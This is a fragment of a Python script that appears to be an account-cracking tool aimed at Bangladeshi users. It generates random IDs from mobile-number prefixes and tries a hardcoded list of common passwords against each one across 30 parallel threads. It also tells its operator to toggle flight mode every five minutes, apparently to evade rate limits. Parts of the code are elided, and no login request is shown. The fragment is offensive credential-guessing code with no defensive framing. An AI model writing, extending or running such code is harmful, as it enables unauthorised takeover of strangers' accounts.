...
def rndm_bd():
        ...
        with tred(max_workers=30) as Mistah:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : 017/019/016/018/013'  \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:30],ids[:30],'102030','009988','908070','১২৩৪৫৬','১২৩৪৫৬৭৮','234567','405060','708090','665544','123412','00998877','778899','345678','908070','100200','135790','567890','first last','first@123','First Last','lastlast']
